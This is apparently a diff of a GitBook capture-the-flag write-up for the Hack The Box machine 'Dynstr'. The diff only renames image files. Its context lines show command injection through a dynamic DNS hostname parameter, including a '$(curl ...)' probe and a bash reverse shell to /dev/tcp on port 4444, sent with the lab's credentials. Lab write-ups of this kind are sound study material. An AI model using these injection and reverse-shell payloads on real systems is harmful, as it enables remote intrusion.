@@ -28,7 +28,7 @@ At the bottom, it appears we have to add `dyna.htb` to the `/etc/hosts` file:
 
 Also, there is some information on the page:
 
-<figure><img src="../../../.gitbook/assets/image (35) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since DNS is open, we can use `dig`:
 
@@ -136,7 +136,7 @@ $ curl -G --data-urlencode 'hostname=$(curl 168431117/rce).no-ip.htb' http://dyn
 911 [nsupdate failed]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (38) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 $ curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431117/4444 0>&1").no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/updat
@@ -217,7 +217,7 @@ www-data@dynstr:/etc/bind$ nsupdate -k infra.key
 
 Afterwards, we can `ssh` in as the user:
 
-<figure><img src="../../../.gitbook/assets/image (39) (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39) (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Sudo
 
